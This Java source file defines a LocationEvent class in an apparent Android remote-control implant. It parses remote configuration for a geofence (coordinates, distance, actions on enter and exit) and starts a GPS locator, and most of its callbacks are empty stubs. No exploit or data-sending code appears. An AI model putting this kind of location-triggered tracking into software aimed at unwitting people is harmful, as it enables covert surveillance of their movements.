package com.ht.RCSAndroidGUI.event;

import java.io.IOException;

import android.location.Location;
import android.location.LocationListener;
import android.os.Bundle;
import android.util.Log;

import com.ht.RCSAndroidGUI.agent.position.GPSLocator;
import com.ht.RCSAndroidGUI.agent.position.GPSLocatorDistance;
import com.ht.RCSAndroidGUI.utils.DataBuffer;

public class LocationEvent extends EventBase implements LocationListener {

	private static final String TAG = "LocationEvent";
	int actionOnEnter;
	int actionOnExit;

	int distance;
	float latitudeOrig;
	float longitudeOrig;

	@Override
	public void begin() {
		GPSLocator locator = new GPSLocatorDistance(this, latitudeOrig, longitudeOrig, distance);
	}

	@Override
	public void end() {
		// TODO Auto-generated method stub

	}

	@Override
	public boolean parse(EventConf eventConf) {
		byte[] confParams = eventConf.getParams();
		final DataBuffer databuffer = new DataBuffer(confParams, 0,
				confParams.length);

		try{
			actionOnEnter = eventConf.getAction();
			actionOnExit = databuffer.readInt();

			distance = databuffer.readInt();

			latitudeOrig = (float) databuffer.readDouble();
			longitudeOrig = (float) databuffer.readDouble();
			
			
			Log.d(TAG, "Lat: " + latitudeOrig + " Lon: " + longitudeOrig
					+ " Dist: " + distance);
		}catch(IOException ex){
			return false;
		}

		return true;
	}

	@Override
	public void go() {
	}

	public void onLocationChanged(Location arg0) {
		// TODO Auto-generated method stub
		
	}

	public void onProviderDisabled(String arg0) {
		// TODO Auto-generated method stub
		
	}

	public void onProviderEnabled(String arg0) {
		// TODO Auto-generated method stub
		
	}

	public void onStatusChanged(String arg0, int arg1, Bundle arg2) {
		// TODO Auto-generated method stub
		
	}

}
